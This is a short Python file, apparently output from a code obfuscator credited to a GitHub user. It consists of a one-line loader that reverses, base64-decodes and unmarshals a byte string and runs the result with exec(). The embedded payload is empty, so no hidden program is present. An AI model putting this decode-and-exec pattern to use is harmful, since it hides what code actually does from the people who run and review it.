#!/usr/bin/python3
# https://www.github.com/Syafii-XD
# Time : Fri Jun 24 04:30:51 2022
# -------------------------------
_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));exec((_)(b''))